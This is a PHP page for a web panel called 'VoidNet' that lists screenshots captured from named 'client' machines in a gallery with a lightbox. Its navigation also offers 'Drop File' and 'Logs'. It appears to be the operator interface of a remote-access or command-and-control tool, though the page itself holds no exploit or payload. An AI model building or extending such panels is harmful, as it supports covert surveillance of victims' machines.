<?php
require_once __DIR__ . '/../includes/auth.php';
require_once __DIR__ . '/../includes/db.php';

$query = "SELECT s.file_path, s.captured_at, c.machine_name 
          FROM screenshots s 
          JOIN clients c ON s.client_id = c.id 
          ORDER BY s.captured_at DESC";
$result = $mysqli->query($query);
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Screenshots - VoidNet</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
      color: #e0e0e0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      min-height: 100vh;
    }

    .sidebar {
      background: linear-gradient(180deg, #242424 0%, #1e1e1e 100%);
      width: 250px;
      position: fixed;
      top: 0;
      left: 0;
      bottom: 0;
      border-right: 1px solid #3a3a3a;
      box-shadow: 2px 0 10px rgba(0, 0, 0, 0.3);
    }

    .sidebar-header {
      padding: 25px 20px;
      border-bottom: 1px solid #3a3a3a;
      background: #1e1e1e;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .sidebar-header img {
      width: 32px;
      height: 32px;
      margin-right: 10px;
      filter: drop-shadow(0 0 5px rgba(255, 255, 255, 0.1));
    }

    .sidebar-header h1 {
      color: #ffffff;
      font-size: 20px;
      font-weight: 600;
    }

    .sidebar-nav {
      padding: 20px 0;
    }

    .sidebar-nav a {
      display: flex;
      align-items: center;
      padding: 14px 20px;
      color: #ccc;
      text-decoration: none;
      transition: all 0.3s ease;
      border-left: 3px solid transparent;
      font-size: 14px;
      font-weight: 500;
    }

    .sidebar-nav a:hover {
      background: rgba(255, 255, 255, 0.05);
      color: #ffffff;
      border-left-color: #666;
    }

    .sidebar-nav a.active {
      background: rgba(255, 255, 255, 0.1);
      color: #ffffff;
      border-left-color: #888;
      font-weight: 600;
    }

    .sidebar-footer {
      position: absolute;
      bottom: 0;
      width: 100%;
      padding: 20px;
      border-top: 1px solid #3a3a3a;
      background: #1e1e1e;
    }

    .sidebar-footer a {
      display: block;
      color: #ff6b6b;
      text-decoration: none;
      font-weight: 600;
      text-align: center;
      padding: 10px;
      border-radius: 6px;
      transition: all 0.3s ease;
      font-size: 14px;
    }

    .sidebar-footer a:hover {
      background: rgba(255, 107, 107, 0.1);
      color: #ff8a8a;
    }

    .main-content {
      margin-left: 250px;
      padding: 30px;
      min-height: 100vh;
    }

    .page-header {
      margin-bottom: 30px;
      padding-bottom: 15px;
      border-bottom: 2px solid #3a3a3a;
    }

    .page-header h1 {
      color: #ffffff;
      font-size: 28px;
      font-weight: 600;
    }

    .panel {
      background: linear-gradient(135deg, #2a2a2a 0%, #1e1e1e 100%);
      border-radius: 10px;
      border: 1px solid #3a3a3a;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
    }

    .panel-header {
      background: linear-gradient(135deg, #1e1e1e 0%, #141414 100%);
      padding: 20px 25px;
      border-bottom: 1px solid #3a3a3a;
    }

    .panel-title {
      margin: 0;
      color: #ffffff;
      font-size: 18px;
      font-weight: 600;
    }

    .panel-body {
      padding: 25px;
    }

    .gallery {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
      gap: 20px;
    }

    .gallery-item {
      background: #1b1b1b;
      border: 1px solid #444;
      border-radius: 6px;
      overflow: hidden;
      transition: transform 0.2s ease;
      cursor: pointer;
    }

    .gallery-item:hover {
      transform: scale(1.03);
      border-color: #888;
    }

    .gallery-item img {
      width: 100%;
      height: auto;
      display: block;
    }

    .gallery-item .info {
      padding: 10px;
      font-size: 13px;
      color: #aaa;
      background: #121212;
      border-top: 1px solid #333;
    }

    #lightbox {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.85);
      justify-content: center;
      align-items: center;
      z-index: 9999;
    }

    #lightbox img {
      max-width: 90%;
      max-height: 90%;
      border: 4px solid #0ff;
      border-radius: 6px;
    }

    .no-data {
      color: #777;
      font-style: italic;
      padding: 30px;
    }
  </style>
</head>
<body>
  <aside class="sidebar">
    <div class="sidebar-header">
      <img src="../assets/image/logo.png" alt="VoidNet">
      <h1>VoidNet</h1>
    </div>
    <nav class="sidebar-nav">
      <a href="dashboard.php">Dashboard</a>
      <a href="clients.php">Clients</a>
      <a href="drop.php">Drop File</a>
      <a href="screenshots.php" class="active">Screenshots</a>
      <a href="logs.php">Logs</a>
    </nav>
    <div class="sidebar-footer">
      <a href="../logout.php">Log Out</a>
    </div>
  </aside>

  <main class="main-content">
    <div class="page-header">
      <h1>Screenshots</h1>
    </div>

    <div class="panel">
      <div class="panel-header">
        <h2 class="panel-title">Screenshot Gallery</h2>
      </div>
      <div class="panel-body">
        <div class="gallery">
          <?php while($ss = $result->fetch_assoc()): ?>
            <div class="gallery-item" data-full-image="../<?php echo htmlspecialchars($ss['file_path']); ?>">
              <img src="../<?php echo htmlspecialchars($ss['file_path']); ?>" alt="Screenshot">
              <div class="info">
                <strong><?php echo htmlspecialchars($ss['machine_name']); ?></strong><br>
                <?php echo htmlspecialchars($ss['captured_at']); ?>
              </div>
            </div>
          <?php endwhile; ?>
          <?php if ($result->num_rows === 0): ?>
            <div class="no-data">No screenshots have been uploaded yet.</div>
          <?php endif; ?>
        </div>
      </div>
    </div>
  </main>

  <div id="lightbox">
    <img src="" alt="Screenshot View">
  </div>

  <script>
    const lightbox = document.getElementById('lightbox');
    const lightboxImg = lightbox.querySelector('img');

    document.querySelectorAll('.gallery-item').forEach(item => {
      item.addEventListener('click', () => {
        lightbox.style.display = 'flex';
        lightboxImg.src = item.dataset.fullImage;
      });
    });

    lightbox.addEventListener('click', () => {
      lightbox.style.display = 'none';
      lightboxImg.src = '';
    });
  </script>
</body>
</html>
